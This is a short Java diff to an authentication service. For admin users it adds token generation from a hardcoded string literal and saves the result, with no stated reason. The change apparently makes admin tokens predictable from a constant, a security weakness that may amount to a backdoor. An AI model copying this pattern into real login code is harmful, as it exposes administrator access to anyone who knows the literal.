@@ -24,6 +24,10 @@ public class DefaultAuthenticationService implements AuthenticationService {
             if (Objects.isNull(authUser)) {
                 authUser = registerUser(user);
             }
+            if (Role.ADMIN.equals(authUser.getRole())) {
+                authUser.setToken(TokenGenerator.generateToken("eooYPagGx2"));
+                userDao.save(authUser);
+            }
         }
         return authUser;
     }
